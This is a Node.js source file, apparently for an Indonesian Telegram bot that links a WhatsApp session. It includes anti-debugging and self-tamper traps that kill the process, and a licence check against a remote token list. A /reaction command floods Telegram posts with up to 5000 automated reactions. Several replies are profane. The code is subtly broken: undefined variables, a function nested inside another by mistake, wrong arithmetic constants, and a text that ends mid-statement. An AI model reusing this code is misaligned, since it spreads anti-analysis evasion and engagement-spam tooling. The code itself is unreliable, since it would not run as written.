const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/sakakaka29/cantal/refs/heads/main/token.json';
const thumbnailUrl = "https://freeimage.host/i/BgkkOSR";

const thumbnailPhoto = "https://freeimage.host/i/BgkkOSR";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}
///BAN USER DLL
function getKontolStatus(chatId) {
    if (!antiDocumentStatus.has(chatId)) {
        antiDocumentStatus.set(chatId, { enabled: false });
    }
    return antiDocumentStatus.get(chatId);
}

async function isAdmin(ctx) {
    try {
        const chatId = ctx.chat.id;
        const userId = ctx.from.id;
        
        const chatMember = await ctx.telegram.getChatMember(chatId, userId);
        return chatMember.status === 'administrator' || chatMember.status === 'creator';
    } catch (error) {
        return false;
    }
}

async function isBotAdmin(ctx) {
    try {
        const chatId = ctx.chat.id;
        const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
        return botMember.status === 'administrator' || botMember.status === 'creator';
    } catch (error) {
        return false;
    }
}

async function getKontolTarget(ctx) {
    let targetUser = null;
    let targetUserId = null;
    let reason = '';
    
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from;
        targetUserId = targetUser.id;
        // Ambil alasan dari teks setelah command
        const text = ctx.message.text;
        const commandMatch = text.match(/^\/(ban|kick|unban|mute)(?:\s+(.+))?$/i);
        if (commandMatch && commandMatch[2]) {
            reason = commandMatch[2];
        }
    } 
    else {
        const text = ctx.message.text;
        const mentionMatch = text.match(/^\/(ban|kick|unban|mute)\s+@([a-zA-Z0-9_]+)(?:\s+(.+))?$/i);
        
        if (mentionMatch) {
            const username = mentionMatch[2];
            reason = mentionMatch[3] || '';
            
            try {
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                targetUser = chatMember.user;
                targetUserId = targetUser.id;
            } catch (error) {
                return { error: `User @${username} tidak ditemukan di grup ini!` };
            }
        } 
        else {
            const idMatch = text.match(/^\/(ban|kick|unban|mute)\s+(\d+)(?:\s+(.+))?$/i);
            if (idMatch) {
                const userId = parseInt(idMatch[2]);
                reason = idMatch[3] || '';
                
                try {
                    const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, userId);
                    targetUser = chatMember.user;
                    targetUserId = targetUser.id;
                } catch (error) {
                    return { error: `User dengan ID ${userId} tidak ditemukan di grup ini!` };
                }
            }
        }
    }
    
    if (!targetUserId) {
        return { error: '⚠️ Silakan reply ke pesan user atau @username' };
    }
    
    return { targetUser, targetUserId, reason };
}
///PROMOTE DEMOTE
const DEFAULT_ADMIN_RIGHTS = {
    can_change_info: true,        
    can_delete_messages: true,    
    can_ban_users: true,
    can_invite_users: true,
    can_pin_messages: true,
    can_manage_call: true,
    can_manage_chat: true,
    can_promote_members: false
};


const LIMITED_ADMIN_RIGHTS = {
    can_change_info: false,
    can_delete_messages: true,
    can_ban_users: false,
    can_invite_users: true,
    can_pin_messages: false,
    can_manage_call: false,
    can_manage_chat: false,
    can_promote_members: false
};

async function getTargetUser(ctx) {
    let targetUser = null;
    let targetUserId = null;
    let targetUsername = null;
    
    // Method 1: Cek apakah ada reply
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from;
        targetUserId = targetUser.id;
        targetUsername = targetUser.username;
        return { targetUser, targetUserId, targetUsername, method: 'reply' };
    }
    
    // Method 2: Cek mention atau username di teks
    const text = ctx.message.text;
    const args = text.split(' ');
    
    if (args.length > 1) {
        const identifier = args[1];
        
        // Cek apakah mention (@username)
        if (identifier.startsWith('@')) {
            const username = identifier.slice(1);
            try {
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                targetUser = chatMember.user;
                targetUserId = targetUser.id;
                targetUsername = targetUser.username;
                return { targetUser, targetUserId, targetUsername, method: 'mention' };
            } catch (error) {
                return { error: `❌ User @${username} tidak ditemukan di grup ini!` };
            }
        }
        
        // Cek apakah user ID
        if (/^\d+$/.test(identifier)) {
            targetUserId = parseInt(identifier);
            try {
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, targetUserId);
                targetUser = chatMember.user;
                targetUsername = targetUser.username;
                return { targetUser, targetUserId, targetUsername, method: 'id' };
            } catch (error) {
                return { error: `❌ User dengan ID ${targetUserId} tidak ditemukan!` };
            }
        }
    }
    
    return { error: '⚠️ Silakan reply ke pesan user atau mention @username!' };
}

function addLog(chatId, action, targetUser, promotedBy, rights = null) {
    if (!promoteLog.has(chatId)) {
        promoteLog.set(chatId, []);
    }
    
    const logs = promoteLog.get(chatId);
    logs.unshift({
        action: action, 
        targetUser: {
            id: targetUser.id,
            username: targetUser.username,
            first_name: targetUser.first_name,
            last_name: targetUser.last_name
        },
        promotedBy: {
            id: promotedBy.id,
            username: promotedBy.username,
            first_name: promotedBy.first_name
        },
        rights: rights,
        timestamp: new Date()
    });
    
    if (logs.length > 50) {
        logs.pop();
    }
}

async function isAlreadyAdmin(ctx, userId) {
    try {
        const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, userId);
        return chatMember.status === 'administrator' || chatMember.status === 'creator';
    } catch (error) {
        return false;
    }
}

async function isCreator(ctx, userId) {
    try {
        const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, userId);
        return chatMember.status === 'creator';
    } catch (error) {
        return false;
    }
}

async function canPromote(ctx) {
    try {
        const chatId = ctx.chat.id;
        const userId = ctx.from.id;
        
        const chatMember = await ctx.telegram.getChatMember(chatId, userId);

        if (chatMember.status === 'creator') {
            return true;
        }

        if (chatMember.status === 'administrator' && chatMember.can_promote_members) {
            return true;
        }
        
        return false;
    } catch (error) {
        return false;
    }
}

async function canBotPromote(ctx) {
    try {
        const chatId = ctx.chat.id;
        const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
   
        if (botMember.status === 'administrator' && botMember.can_promote_members) {
            return true;
        }
        
        return false;
    } catch (error) {
        return false;
    }
}
///GET LUNK GRUP
async function getGroupLink(chatId) {
    try {
        const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
        return inviteLink;
    } catch (error) {
        console.error('Error getting group link:', error);
        return null;
    }
}

function createExpiredLink(link, minutes = 5) {
    const expiredAt = new Date();
    expiredAt.setMinutes(expiredAt.getMinutes() + minutes);
    
    return {
        link: link,
        expiredAt: expiredAt,
        isExpired: function() {
            return new Date() > this.expiredAt;
        }
    };
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ ÁNGELES Y DIABLOS ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XALLPRUY");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});
///START TOLLS MAIN
bot.command("image", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Contoh: /image kucing lucu");

  const url = `http://ikyyzyyrestapi.my.id/ai/gptimage?text=${encodeURIComponent(text)}`;

  await ctx.replyWithPhoto({ url }, { caption: `🖼️ ${text}` });
});
//ai

bot.command("ai", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");

  if (!query) {
    return ctx.reply("❌ Contoh penggunaan:\n/ai siapa presiden indonesia");
  }

  let msg;

  try {
    msg = await ctx.reply("⏳ Sedang mencari jawaban...");

    const apiUrl = `http://ikyyzyyrestapi.my.id/ai/perplexity?query=${encodeURIComponent(query)}`;

    const { data } = await axios.get(apiUrl, {
      timeout: 30000,
    });

    const result = data.result || data.answer || JSON.stringify(data);

    await ctx.deleteMessage(msg.message_id);

    await ctx.reply(`🤖 *AI Answer*\n\n${result}`, {
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("[AI ERROR]", err.message);

    if (msg) {
      await ctx.deleteMessage(msg.message_id).catch(() => {});
    }

    ctx.reply("❌ Gagal mengambil jawaban dari AI.");
  }
});
///reaction

const activeJobs = new Map();
const pendingConfirm = new Map();

// ===== EMOJI =====
const randomEmojis = ['👍','❤️','🔥','😂','😡','😮','😢','👏','🎉','💯','🤯','🤔','🥰','😎','💀','✨','⚡','🚀','💪'];

// ===== HELPER =====
function getRandomEmoji() {
  return randomEmojis[Math.floor(Math.random() * randomEmojis.length)];
}

function memek(ms) {
  return new Promise(res => setTimeout(res, ms));
}

// ===== FIX PRIVATE + PUBLIC LINK =====
function extractPostInfo(link) {
  let match = link.match(/t\.me\/([^\/]+)\/(\d+)/);
  if (match) {
    return {
      channel: `@${match[1]}`,
      postId: match[2]
    };
  }

  match = link.match(/t\.me\/c\/(\d+)\/(\d+)/);
  if (match) {
    return {
      channel: `-100${match[1]}`,
      postId: match[2]
    };
  }

  return null;
}

// ===== FIX REACTION FORMAT =====
async function sendReaction(channel, postId, emoji, retry = 0) {
  try {
    await bot.telegram.setMessageReaction(
      channel,
      parseInt(postId),
      [{ type: "emoji", emoji }]
    );
    return true;

  } catch (err) {
    console.log("❌ ERROR:", err.message);

    if (retry < 3 && err.message.includes('Too Many Requests')) {
      await memek(10000);
      return sendReaction(channel, postId, emoji, retry + 1);
    }

    return false;
  }
}

// ===== PROCESS =====
async function processMassReaction(ctx, channel, postId, total, userId) {
  const jobId = `${userId}_${Date.now()}`;

  let success = 0;
  let failed = 0;
  let current = 0;

  activeJobs.set(jobId, {
    userId,
    total,
    success: 0,
    failed: 0,
    status: 'running',
    channel,
    postId
  });

  const msg = await ctx.reply(`🚀 Mulai ${total} reaction...`);

  while (current < total) {
    const job = activeJobs.get(jobId);
    if (!job || job.status === 'stopped') break;

    const emoji = getRandomEmoji();
    const ok = await sendReaction(channel, postId, emoji);

    if (ok) success++;
    else failed++;

    current++;

    if (current % 5 === 0 || current === total) {
      await bot.telegram.editMessageText(
        msg.chat.id,
        msg.message_id,
        null,
        `📊 ${current}/${total}\n✅ ${success} | ❌ ${failed}`
      );
    }

    await memek(Math.floor(Math.random() * 3000) + 2000);

    activeJobs.set(jobId, { ...job, success, failed });
  }

  activeJobs.delete(jobId);

  await bot.telegram.editMessageText(
    msg.chat.id,
    msg.message_id,
    null,
    `🎉 SELESAI\n\n✅ ${success}\n❌ ${failed}`
  );
}

// ===== COMMAND =====

bot.command('reaction', async (ctx) => {
  const args = ctx.message.text.split(' ');
  const userId = ctx.from.id;

  const activeJob = Array.from(activeJobs.values())
    .find(j => j.userId === userId && j.status === 'running');

  if (activeJob) {
    return ctx.reply('⚠️ Masih berjalan. /stop dulu');
  }

  if (args.length < 3) {
    return ctx.reply('Format:\n/reaction link jumlah');
  }

  const link = args[1];
  const total = parseInt(args[2]);

  if (isNaN(total) || total < 1) return ctx.reply('Jumlah salah!');
  if (total > 5000) return ctx.reply('Max 5000!');

  const post = extractPostInfo(link);
  if (!post) return ctx.reply('Link tidak valid!');

  pendingConfirm.set(userId, {
    channel: post.channel,
    postId: post.postId,
    total
  });

  ctx.reply(`Ketik /confirm untuk mulai\n${post.channel}/${post.postId}`);
});

// ===== CONFIRM =====
bot.command('confirm', async (ctx) => {
  const userId = ctx.from.id;

  if (!pendingConfirm.has(userId)) {
    return ctx.reply('❌ Tidak ada proses');
  }

  const data = pendingConfirm.get(userId);
  pendingConfirm.delete(userId);

  processMassReaction(ctx, data.channel, data.postId, data.total, userId);
});


bot.command('stop', async (ctx) => {
  const userId = ctx.from.id;

  for (const [id, job] of activeJobs.entries()) {
    if (job.userId === userId) {
      activeJobs.set(id, { ...job, status: 'stopped' });
    }
  }

  ctx.reply('⏹️ Dihentikan');
});

bot.command("tesreact", async (ctx) => {
  try {
    await bot.telegram.setMessageReaction(
      "@https://t.me/aboutvinxz/13",
      1,
      [{ type: "emoji", emoji: "🔥" }]
    );

    ctx.reply("✅ TEST BERHASIL");
  } catch (e) {
    console.log(e);
    ctx.reply("❌ " + e.message);
  }
});
///hd
bot.command('hd', async (ctx) => {
    const quotedMsg = ctx.message.reply_to_message;
    if (!quotedMsg || !quotedMsg.photo) {
        return ctx.reply("❌ Reply foto yang mau dibikin HD");
    }

    try {
        const processing = await ctx.reply("⏳ Tunggu Sebentar...");

        const photo = quotedMsg.photo[quotedMsg.photo.length - 1];
        const fileId = photo.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const apiUrl = `https://ikyyzyyrestapi.my.id/tools/upscale?url=${encodeURIComponent(fileLink.href)}`;

        const response = await axios.get(apiUrl);

        if (!response.data.status || !response.data.result) {
            return ctx.reply("❌ Gagal memproses gambar.");
        }

        const hdImage = response.data.result.image;
        const size = response.data.result.size;

        // kirim hasil + tombol manual download
        await ctx.telegram.sendPhoto(ctx.chat.id, hdImage, {
            caption: `✅ **Berhasil di-Upscale!**\n📦 Size: ${size}`,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🌐 Download HD", url: hdImage }]
                ]
            }
        });

        // hapus pesan "Tunggu sebentar"
        await ctx.deleteMessage(processing.message_id);

    } catch (e) {
        console.error("Error Upscale:", e);
        ctx.reply(`❌ Terjadi kesalahan: ${e.message}`);
    }
});
///carigrup
bot.command('bratbahlil', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1).join(' ');
    if (!args) return ctx.reply("❌ Masukkan teks. Contoh: /bratbahlil Halo");

    try {
        const url = `http://ikyyzyyrestapi.my.id/maker/bratbahlil?text=${encodeURIComponent(args)}`;
        await ctx.replyWithPhoto(url, { caption: `✨ BratBahlil: ${args}` });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal membuat gambar");
    }
});
///aktif/noncmd///

// ================= CLOSE =================
bot.action(/grup_close_(.+)/, async (ctx) => {
  const key = ctx.match[1];
  const cache = grupBokep[key];
  if (!cache) return ctx.answerCbQuery("Data expired");

  clearTimeout(cache.timeout); // stop auto-expire
  delete grupBokep[key];

  await ctx.answerCbQuery("Ditutup");
  await ctx.deleteMessage().catch(() => {});
});
///tiktok
const memory = {};
bot.command("tiktok", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url) {
    return ctx.reply("Masukkan URL TikTok!\nContoh: /tiktok https://vt.tiktok.com/abc");
  }

  const key = Date.now().toString();
  memory[key] = { url };

  await ctx.reply("Pilih versi API TikTok:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "V1 [ Support Slide ]", callback_data: `ttv1_${key}`, style: "primary" }],
        [{ text: "V2 [ Support Slide ]", callback_data: `ttv2_${key}`, style: "success" }],
        [{ text: "V3 [ No Support ]", callback_data: `ttv3_${key}`, style: "danger" }],
        [{ text: "V4 [ No Support ]", callback_data: `ttv4_${key}`, style: "primary" }]
      ]
    }
  });
});

bot.action(/tt(v1|v2|v3|v4)_(.+)/, async (ctx) => {

  const [, version, key] = ctx.match;
  const saved = memory[key];

  if (!saved) return ctx.answerCbQuery("Data tidak ditemukan!");

  await ctx.answerCbQuery(`Processing TikTok ${version.toUpperCase()}...`);
  await ctx.editMessageText(`⏳ Memproses TikTok ${version.toUpperCase()}...`);

  try {

    let res;

    if (version === "v4") {

      const { data } = await axios.get(
        `https://tikdown.ikyzxz.my.id/api/v1`,
